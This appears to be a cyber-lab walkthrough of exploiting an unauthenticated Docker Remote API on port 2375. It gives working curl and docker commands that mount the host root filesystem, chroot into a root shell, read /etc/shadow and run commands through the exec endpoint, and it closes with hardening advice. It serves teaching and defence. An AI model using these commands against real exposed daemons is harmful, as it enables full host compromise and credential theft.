# Docker Remote API Unauthenticated RCE & Host Escape (Port 2375)

## Overview

The Docker daemon (`dockerd`) exposes a REST API for orchestrating containers, images, volumes, and networks. By default, Docker communicates over a local Unix domain socket (`/var/run/docker.sock`). However, administrators, CI/CD runners, and developers frequently expose this API over TCP (typically TCP port 2375 for plaintext HTTP or port 2376 for TLS) to enable remote management.

When TCP port 2375 is exposed without mutual TLS authentication, anyone who can reach the network socket holds **root-equivalent privileges over the underlying host system**. Threat actor syndicates (including Kinsing, TeamTNT, and Drokbk) aggressively scan public subnets for port 2375 to deploy automated cryptomining worms, credential extractors, and root backdoors.

- **Primary Interface**: TCP Port `2375` (`http://localhost:2375`)
- **Docker Shortcut**: `./lab start docker-api`
- **Container Name**: `cyberlab_realworld_docker_api`
- **RAM Footprint**: ~100 MB (`docker:dind` daemon)

---

## Architecture & Attack Chain

```
+-------------------------------------------------------------+
|                Attacker Machine (curl / Docker CLI)         |
+-------------------------------------------------------------+
                               |
                        TCP Port 2375
                               v
+-------------------------------------------------------------+
|              Exposed Docker Daemon (Port 2375)              |
|                                                             |
|  Step 1: Reconnaissance (GET /version, GET /containers/json)|
|                                                             |
|  Step 2: Malicious Container Injection                      |
|    - POST /containers/create                                |
|    - Image: alpine                                          |
|    - HostConfig.Binds: ["/:/host"]                          |
|                                                             |
|  Step 3: Execution & Host Escape                            |
|    - POST /containers/{id}/start                            |
|    - Escape to host rootfs via chroot /host                 |
|    - Direct execution via docker -H tcp://... exec          |
|                                                             |
|  [Result: Unrestricted Root Compromise of the Host System]  |
+-------------------------------------------------------------+
```

---

## Exploitation Walkthrough

### 1. Reconnaissance via Curl

Verify that the remote API responds to unauthenticated requests:

```bash
# Query the Docker Engine version and architecture
curl -s http://localhost:2375/version | jq .

# List all active containers
curl -s http://localhost:2375/containers/json | jq .

# Inspect system information and storage drivers
curl -s http://localhost:2375/info | jq '{Containers, Images, ServerVersion, OperatingSystem}'
```

### 2. Targeting via Local Docker CLI

You can point your local `docker` client directly at the target using the `-H` flag:

```bash
# Execute docker commands remotely without SSH or credentials
docker -H tcp://localhost:2375 ps
docker -H tcp://localhost:2375 images
```

### 3. Interactive Shell & Host Escape via Rootfs Mount (`chroot /host`)

By mounting the host root filesystem (`/`) into a new container, an attacker can chroot directly into `/host` to obtain a full root interactive shell on the underlying host or DinD instance:

```bash
# Method A: Interactive root shell via chroot on the mounted host
docker -H tcp://localhost:2375 run -it --rm -v /:/host alpine:latest chroot /host sh

# Method B: Execute arbitrary commands on the host rootfs
docker -H tcp://localhost:2375 run --rm -v /:/host alpine:latest chroot /host id
docker -H tcp://localhost:2375 run --rm -v /:/host alpine:latest chroot /host cat /etc/shadow
```

### 4. Direct Remote Command Execution via Docker Exec

Attackers can execute commands directly within any active container on the exposed daemon using `docker exec`:

```bash
# Spawn an interactive shell inside a running container
docker -H tcp://localhost:2375 exec -it cyberlab_realworld_docker_api sh

# Execute arbitrary commands non-interactively
docker -H tcp://localhost:2375 exec cyberlab_realworld_docker_api ps aux
```

### 5. Remote Host Compromise via Raw REST API (Curl)

> [!NOTE]
> In traditional Linux host escapes, attackers often write scheduled tasks into `/host/etc/crontab` or `/host/etc/cron.d/`. However, containerized Docker environments (such as Alpine DinD) do not run an active cron daemon (`crond`). Instead, attackers achieve immediate RCE by executing commands directly using `chroot /host` or via the Docker Remote API `exec` endpoint.

**Option A: Spawn Container with Host Mount and Chroot Execution**

```bash
# Step 1: Create container with host root mounted and chroot execution
CONTAINER_ID=$(curl -s -X POST http://localhost:2375/containers/create \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine:latest",
    "Cmd": ["chroot", "/host", "sh", "-c", "echo pwned > /tmp/hacked && id && cat /etc/os-release"],
    "HostConfig": {
      "Binds": ["/:/host"]
    }
  }' | jq -r .Id)

# Step 2: Start container
curl -s -X POST "http://localhost:2375/containers/${CONTAINER_ID}/start"

# Step 3: Fetch execution output logs
curl -s "http://localhost:2375/containers/${CONTAINER_ID}/logs?stdout=1&stderr=1"
```

**Option B: REST API Exec Instance on Existing Container**

```bash
# Step 1: Create exec instance
EXEC_ID=$(curl -s -X POST http://localhost:2375/containers/cyberlab_realworld_docker_api/exec \
  -H "Content-Type: application/json" \
  -d '{"AttachStdout": true, "AttachStderr": true, "Cmd": ["id"]}' | jq -r .Id)

# Step 2: Start exec instance and stream output
curl -s -X POST "http://localhost:2375/exec/${EXEC_ID}/start" \
  -H "Content-Type: application/json" \
  -d '{"Detach": false, "Tty": false}'
```

### 6. Kinsing / Cryptojacking Emulation

Automated malware scans for port 2375, creates a container running a persistent mining binary, escapes to the host using rootfs volume mounts (`chroot /host`) or Docker `exec`, and terminates competitor mining processes.

---

## Defensive Remediation & Hardening

1. **Disable Network TCP Listening**:
   Ensure dockerd is configured to bind exclusively to `/var/run/docker.sock` in `/etc/docker/daemon.json`:
   ```json
   {
     "hosts": ["unix:///var/run/docker.sock"]
   }
   ```
2. **Enforce Mutual TLS (mTLS on Port 2376)**:
   If remote API access is essential, mandate client certificate verification:
   ```json
   {
     "hosts": ["tcp://0.0.0.0:2376", "unix:///var/run/docker.sock"],
     "tls": true,
     "tlscacert": "/etc/docker/ca.pem",
     "tlscert": "/etc/docker/server-cert.pem",
     "tlskey": "/etc/docker/server-key.pem",
     "tlsverify": true
   }
   ```
3. **Deploy Rootless Docker**:
   Run the Docker daemon as an unprivileged non-root user so container escapes cannot compromise the underlying host operating system.

---

## Video Walkthroughs & Technical References

- [How Abusing Docker API Led to Remote Code Execution, Same Origin Bypass & more](https://www.youtube.com/watch?v=w7tAfIlMIa0)
- [Vulhub Docker Unauthorized RCE Environment](https://vulhub.org/#/environments/docker/unauthorized-rce/)
- [Docker Engine API Official Documentation](https://docs.docker.com/engine/api/latest/)
